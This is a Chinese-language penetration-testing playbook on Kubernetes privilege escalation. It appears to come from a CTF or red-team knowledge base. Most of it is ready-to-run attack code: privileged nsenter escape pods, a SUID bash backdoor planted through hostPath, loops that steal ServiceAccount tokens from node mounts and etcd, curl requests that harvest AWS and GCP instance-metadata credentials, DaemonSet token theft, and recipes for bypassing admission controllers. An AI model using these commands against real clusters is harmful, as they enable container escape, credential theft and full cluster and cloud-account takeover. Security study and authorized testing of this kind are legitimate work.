---
category: cloud
tags: [kubernetes, k8s, 提权, privilege escalation, rbac, serviceaccount, pod escape, 容器逃逸, namespace, 横向移动, lateral movement, admission controller, 准入控制, kyverno, opa, gatekeeper]
triggers: [kubernetes, k8s, pod, serviceaccount, rbac, clusterrole, rolebinding, privileged, hostPID, hostPath, nsenter, etcd, kubelet, kube-system, daemonset, workload identity, IRSA, kiam, kube2iam, kyverno, gatekeeper, webhook, admission, 169.254.169.254, IMDS]
related: [cloud/kubernetes_enum, cloud/container_escape, cloud/aws_s3_enumeration, cloud/aws_lambda_enum]
---

# Kubernetes 提权（Privilege Escalation）

## 什么时候用

- 已获得 Pod 内 shell 或窃取到 ServiceAccount token
- 拿到低权限 K8s 凭证，需要提升到 cluster-admin
- 已在集群内，需要跨 namespace 访问敏感资源
- 需要从 K8s 横向移动到底层云平台（AWS/GCP）
- CTF 题目涉及 K8s RBAC 配置、Pod 安全策略、准入控制等

## 前提条件

- 至少拥有一个 Pod 内 shell 或有效的 ServiceAccount token
- 集群存在 RBAC 配置不当、过度授权或准入控制绕过点
- 对于云横向移动：集群运行在 EKS/GKE 等托管环境中

---

## 攻击步骤

### 1. Pod 内提权 — Privileged 容器逃逸

#### 1.1 privileged + hostPID → nsenter 逃逸

如果 Pod 以 `privileged: true` + `hostPID: true` 运行，直接 nsenter 进入宿主机：

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

创建此类 Pod（需要 create pods 权限）：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
spec:
  hostPID: true
  containers:
    - name: pwn
      image: ubuntu
      tty: true
      securityContext:
        privileged: true
      command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
```

#### 1.2 可写 hostPath 挂载 → SUID 提权

条件：Pod 有可写的 hostPath volume 映射到宿主机文件系统，且宿主机未挂载 `nosuid`。

```bash
# 容器内检测可写挂载
mount | column -t
cat /proc/self/mountinfo | grep -E 'host-path'

# 测试写权限
TEST_DIR=/var/www/html/some-mount
[ -d "$TEST_DIR" ] && [ -w "$TEST_DIR" ] && echo "writable: $TEST_DIR"
```

植入 SUID 后门：

```bash
# 容器内（root）
MOUNT="/var/www/html/survey"
cp /bin/bash "$MOUNT/suidbash"
chmod 6777 "$MOUNT/suidbash"

# 宿主机上执行
/opt/limesurvey/suidbash -p
```

⚠️ 如果宿主机挂载点有 `nosuid` 选项，SUID 位会被忽略。用 `cat /proc/mounts | grep <mountpoint>` 检查。

---

### 2. ServiceAccount Token 滥用

#### 2.1 检查当前 SA 权限

```bash
# Pod 内读取 token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 检查权限
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
```

#### 2.2 窃取节点上其他 Pod 的 SA Token

逃逸到宿主机后，遍历所有挂载的 secret：

```bash
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
    TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
    if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
        ALREADY="$ALREADY|$TOKEN"
        echo "Directory: $i"
        echo "Namespace: $(cat $i)"
        echo ""
        echo $TOKEN
        echo "================================================================================"
    fi
done
```

使用 [can-they.sh](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) 批量检查窃取的 token 权限：

```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"
```

---

### 3. RBAC 提权

#### 3.1 create pods → 窃取高权限 SA Token

有 `create pods` 权限时，创建 Pod 并指定高权限 ServiceAccount：

```bash
echo 'apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: default
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]
  serviceAccountName: high-priv-sa
  automountServiceAccountToken: true
  hostNetwork: true' | kubectl apply -f -

# 读取窃取的 token
kubectl exec -ti privesc-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

#### 3.2 create/patch daemonsets → 全节点窃取 Token

DaemonSet 在每个节点运行，可大规模窃取 token：

```bash
echo 'apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: privesc-ds
spec:
  selector:
    matchLabels:
      name: privesc
  template:
    metadata:
      labels:
        name: privesc
    spec:
      serviceAccountName: high-priv-sa
      automountServiceAccountToken: true
      hostNetwork: true
      containers:
      - name: alpine
        image: alpine
        command: ["/bin/sh"]
        args: ["-c", "sleep 100000"]' | kubectl apply -f -
```

⚠️ `patch` 权限也可修改现有 DaemonSet 的 `serviceAccountName`，但 `update` 权限不行。

#### 3.3 exec into pods → 窃取已运行 Pod 的 Token

```bash
kubectl exec -ti <pod-name> -n <namespace> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

#### 3.4 Node IAM → cluster-admin（EKS）

EKS 节点默认有 `system:node` 角色，可为节点上运行的 Pod 生成 SA token：

```bash
kubectl --context=node1 create token -n <ns> <priv-sa> \
    --bound-object-kind=Pod \
    --bound-object-name=<pod-name> \
    --bound-object-uid=<pod-uid>
```

---

### 4. 跨 Namespace 提权

K8s 默认**无 namespace 间网络隔离**，任意 Pod 可与其他 namespace 通信。

**方法一**：直接利用 SA 权限读取目标 namespace 的 secrets/pods。

**方法二**：逃逸到节点后窃取其他 namespace Pod 的 SA token。

**方法三**：创建 Static Pod 在 kube-system namespace（需节点访问）：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: bad-priv2
  namespace: kube-system
spec:
  containers:
    - name: bad
      hostPID: true
      image: gcr.io/shmoocon-talk-hacking/brick
      stdin: true
      tty: true
      volumeMounts:
        - mountPath: /chroot
          name: host
  securityContext:
    privileged: true
  volumes:
    - name: host
      hostPath:
        path: /
        type: Directory
```

将定义文件写入节点的 `/etc/kubernetes/manifests` 或修改 kubelet `staticPodURL` 指向攻击者服务器。

---

### 5. 从 K8s 横向到云（IMDS / 云凭证）

#### 5.1 AWS — 窃取 IMDS 凭证

```bash
# 发现 IAM Role
IAM_ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "IAM Role: $IAM_ROLE_NAME"

# 获取临时凭证
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME"
```

需要 Pod 满足以下任一条件：
- metadata endpoint 的 hop limit ≥ 2
- Pod 以 `hostNetwork: true` 运行
- 已逃逸到节点

创建 hostNetwork Pod 访问 IMDS：

```bash
kubectl run imds-stealer --restart=Never -ti --rm --image lol \
  --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```

#### 5.2 AWS — IRSA（IAM Roles for Service Accounts）

搜索带 `eks.amazonaws.com/role-arn` 注解的 SA：

```bash
for ns in $(kubectl get namespaces -o custom-columns=NAME:.metadata.name --no-headers); do
    for sa in $(kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name --no-headers); do
        echo "SA: $ns/$sa"
        kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
    done
done | grep -B 1 "amazonaws.com"
```

使用窃取的 Web Identity Token 换取 AWS 凭证：

```bash
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting \
  --role-session-name pwn \
  --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

#### 5.3 AWS — Kiam/Kube2IAM

搜索 `iam.amazonaws.com/role` 注解的 Pod 或 namespace，创建 Pod 伪装 IAM Role：

```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    iam.amazonaws.com/role: target-iam-role
  name: iam-stealer
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]
```

#### 5.4 GCP — Workload Identity

搜索带 `iam.gke.io/gcp-service-account` 注解的 SA：

```bash
for ns in $(kubectl get namespaces -o custom-columns=NAME:.metadata.name --no-headers); do
    for pod in $(kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name --no-headers); do
        kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
    done
done | grep -B 1 "gcp-service-account"
```

Pod 内检查 GCP 身份：

```bash
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```

#### 5.5 GCP — SA Key 泄露

检查 Pod 内是否有 `GOOGLE_APPLICATION_CREDENTIALS` 环境变量指向 JSON key 文件：

```bash
env | grep GOOGLE
find / -name "*.json" 2>/dev/null | xargs grep -l "private_key" 2>/dev/null
```

---

### 6. 节点后渗透 — 窃取 etcd

在 control-plane 节点上直接读取 etcd 数据库中的所有 secrets：

```bash
# 确认 etcd 运行位置
ps -ef | grep etcd | sed 's/--/\n/g' | grep data-dir

# 从 etcd 数据库提取所有 token
db=$(strings /var/lib/etcd/member/snap/db)
for x in $(echo "$db" | grep eyJhbGciOiJ); do
    name=$(echo "$db" | grep $x -B40 | grep registry)
    echo "$name | $x"
done

# 只提取 kube-system 的 default token
echo "$db" | grep eyJhbGciOiJ | while read x; do
    echo "$db" | grep $x -B40 | grep registry
done | grep kube-system | grep default
```

离线分析方式：

```bash
# 1. 快照 etcd
etcdctl snapshot save etcd-loot.db

# 2. 本地恢复
mkdir -p restore
etcdutl snapshot restore etcd-loot.db --data-dir ./restore

# 3. 启动本地 etcd 并提取 secrets
etcd --data-dir=./restore
etcdctl get "" --prefix --keys-only | grep secret
etcdctl get /registry/secrets/default/my-secret
```

---

### 7. 准入控制绕过

#### 7.1 Kyverno 绕过

枚举策略与排除项：

```bash
kubectl get clusterpolicies
kubectl get policies
kubectl get clusterpolicies <POLICY> -o yaml
```

重点关注 `exclude` 字段中排除的实体（用户、SA、角色、namespace），如果能**伪装成被排除的身份**即可绕过策略。

#### 7.2 OPA Gatekeeper 绕过

```bash
kubectl api-resources | grep gatekeeper
kubectl get constrainttemplates
kubectl get k8smandatorylabels
```

查找被**白名单排除的 namespace**，在那里执行攻击操作。

#### 7.3 ValidatingWebhookConfiguration 绕过

```bash
kubectl get validatingwebhookconfiguration <name> -o yaml
```

检查 `namespaceSelector.matchExpressions` 中排除的 namespace：

```yaml
namespaceSelector:
  matchExpressions:
    - key: kubernetes.io/metadata.name
      operator: NotIn
      values:
        - default
        - kube-system
        - some-app
```

如果列表中的 namespace **不存在**且你有 **create namespace** 权限，直接创建该 namespace，所有策略对其不生效。

---

## 常见坑

| 坑 | 说明 |
|---|---|
| `nosuid` 挂载选项 | hostPath 挂载点有 `nosuid` 时 SUID 位无效，`cat /proc/mounts` 检查 |
| `update` vs `patch` | DaemonSet 提权需要 `patch` 权限，`update` 不行 |
| create bindings ≠ 提权 | K8s 防止通过 create/patch RoleBinding 授予自己没有的权限 |
| create roles ≠ 提权 | K8s 防止创建比当前主体权限更高的 Role |
| token 绑定限制 | 较新 K8s 版本的 projected token 有 audience/expiry 限制 |
| control-plane 不可调度 | 云托管集群通常无法在 master 节点调度 Pod，etcd 攻击受限 |
| IMDS hop limit | EKS 默认 hop limit=1，Pod 无法直接访问 IMDS（需 hostNetwork） |
| static pod 限制 | static pod 不能引用 SA/ConfigMap/Secret 等 API 对象 |

## 变体

| 变体 | 说明 |
|---|---|
| **delete pods + unschedulable nodes** | 删除其他节点的 Pod 并标记节点不可调度，Pod 被重调度到已控制的节点，窃取其 SA token |
| **DaemonSet 全节点窃取** | DaemonSet 在所有节点运行，如配置了高权限 SA 则全部节点可窃取 |
| **staticPodURL 远程加载** | 修改 kubelet 的 `staticPodURL` 从攻击者服务器加载 Pod 定义 |
| **Mirror Pod 跨 namespace** | 节点上创建 static pod 指定 `namespace: kube-system` 进入特权命名空间 |
| **Trust Policy 配错** | AWS IRSA 的 trust policy 允许所有 SA 而非指定 SA，任意 SA 可 assume role |

## 相关技术

- [[cloud/kubernetes_enum]] — K8s 枚举（RBAC、SA、secrets 发现）
- [[cloud/container_escape]] — 容器逃逸通用技术（Docker breakout、capability 滥用）
- [[cloud/aws_s3_enumeration]] — 拿到 AWS 凭证后的 S3 枚举
- [[cloud/aws_lambda_enum]] — 拿到 AWS 凭证后的 Lambda 枚举

## 自动化工具

- [Peirates](https://github.com/inguardians/peirates) — K8s 渗透测试工具，支持 SA 窃取、IMDS 利用、Pod 创建等
- [MTKPI](https://github.com/r0binak/MTKPI) — Kubernetes 渗透工具包
- [can-they.sh](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) — 批量检查窃取的 token 权限

## 节点关键文件速查

```
/var/lib/kubelet/kubeconfig
/var/lib/kubelet/kubelet.conf
/var/lib/kubelet/config.yaml
/etc/kubernetes/admin.conf          → kubectl --kubeconfig /etc/kubernetes/admin.conf get all -n kube-system
/etc/kubernetes/kubelet.conf
/etc/kubernetes/bootstrap-kubelet.conf
/etc/kubernetes/manifests/etcd.yaml
/etc/kubernetes/pki/
$HOME/.kube/config
```
